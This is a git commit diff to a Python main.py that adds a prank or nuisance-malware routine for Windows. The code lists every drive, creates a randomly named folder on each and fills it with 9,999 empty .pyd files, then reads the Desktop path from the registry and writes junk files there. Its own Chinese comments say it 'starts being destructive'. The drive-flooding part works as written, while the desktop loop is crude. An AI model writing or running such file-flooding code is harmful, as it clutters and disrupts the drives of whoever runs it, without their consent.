940b4eaecfdf0959115f209af1aff13a70e80a66
lzy20110519 <lzy2110519@outlook.com>
2023-03-18 22:44:12 +0800

    no

--- main.py
+++ main.py
@@ -1,4 +1,8 @@
-import os,sys
+import os, sys
+import string
+import random
+import winreg
+
 import easygui as eg
 
 
@@ -18,5 +22,45 @@ def desktop_bg():
     setWallpaper()
 
 
-desktop_bg()
-def get_fill():
+# desktop_bg()
+def get_disk():
+    # 获取电脑上的所有磁盘
+    global disk_list
+    disk_list = []
+    for c in string.ascii_uppercase:
+        disk = c + ':'
+        if os.path.isdir(disk):
+            disk_list.append(disk)
+    print(disk_list)
+
+
+# 在电脑上创建一大堆文件
+def fill():
+    # 产生一个随机数
+    rand = random.randint(1, 1000)
+    # 在每个磁盘里创建无数个文件
+    get_disk()
+    for i in disk_list:
+        os.makedirs(i + "\\" + str(rand))
+        for j in range(1, 10000):
+            with open((str(i) + '/' + str(rand) + '/' + str(j) + '.pyd'), 'wb+') as f:
+                f.close()
+    # 获取桌面路径
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders')
+    print(winreg.QueryValueEx(key, "Desktop")[0])
+    # 开始有杀伤力了
+    # 在桌面创建无数个文件
+    for j in range(1, 100):
+        with open((winreg.QueryValueEx(key, "Desktop")[0] + '\\123txt'), 'wb+') as f:
+            f.close()
+
+
+def main():
+    print()
+    # desktop_bg()
+    fill()
+
+
+if __name__ == '__main__':
+    main()
